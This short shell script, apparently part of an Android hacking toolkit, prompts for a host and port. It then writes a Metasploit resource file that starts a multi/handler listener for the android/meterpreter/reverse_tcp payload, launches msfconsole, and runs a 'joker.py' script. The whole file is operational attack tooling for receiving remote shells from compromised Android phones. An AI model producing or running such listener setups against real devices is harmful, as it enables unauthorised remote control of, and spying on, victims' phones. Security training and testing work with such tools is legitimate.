
clear

echo -e "$cyan"
read -p "Enter Host~: " ip
read -p "Enter Port~: " port
echo "use exploit/multi/handler" > .msfa.rc
echo "set payload android/meterpreter/reverse_tcp" >> .msfa.rc
echo "set lhost $ip" >> .msfa.rc
echo "set lport $port" >> .msfa.rc
echo "exploit" >> .msfa.rc
msfconsole -r .msfa.rc
python joker.py
